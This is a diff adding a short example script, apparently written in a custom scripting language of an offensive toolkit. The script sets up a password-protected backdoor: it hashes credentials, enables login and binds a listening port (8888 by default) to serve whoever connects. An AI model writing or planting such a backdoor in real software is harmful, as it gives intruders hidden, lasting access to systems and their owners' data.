@@ -1,0 +1,19 @@
+@ Example that shows how to utilize the builtin login system
+
+[version 1.0] @ Compiler version
+
+main:{
+    attack.set_hash("sha256"); @ Set which hashing algorithm we will use
+    attack.hash("user"); @ Hashes our username, this will be saved in $1
+    attack.hash("pass"); @ Hashes our password, and this will be saved in $2
+
+    backdoor.set_hash("sha256");
+    backdoor.welcome("Oh you found my door");
+    backdoor.enable_login(); @ Flipping the switch
+    backdoor.user("$1"); @ Passing our username
+    backdoor.password("$2"); @ Passing our password
+
+    backdoor.start(); @ Bind a port (default is 8888) on the localhost
+    backdoor.serve(); @ This will serve the user that connects
+    backdoor.stop(); @ Closes the connection
+}
